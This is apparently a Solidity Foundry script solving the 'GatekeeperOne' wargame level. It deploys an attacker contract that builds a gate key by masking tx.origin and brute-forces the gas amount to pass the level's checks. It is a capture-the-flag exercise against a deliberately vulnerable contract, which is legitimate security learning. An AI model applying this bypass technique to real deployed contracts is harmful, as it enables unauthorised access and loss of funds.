// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {GatekeeperOne} from "../instances/Ilevel13.sol";

contract Attacker is Test {
    function test() external {
        vm.startBroadcast();
        LetMeThrough lmt = new LetMeThrough();
        lmt.exploit();
        vm.stopBroadcast();
    }
}

contract LetMeThrough {
    GatekeeperOne gate = new GatekeeperOne();

    function exploit() external {
        bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) &
            0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(gate).call{gas: i + (8191 * 3)}(
                abi.encodeWithSignature("enter(bytes8)", _gateKey)
            );
            if (success) {
                break;
            }
        }
    }
}
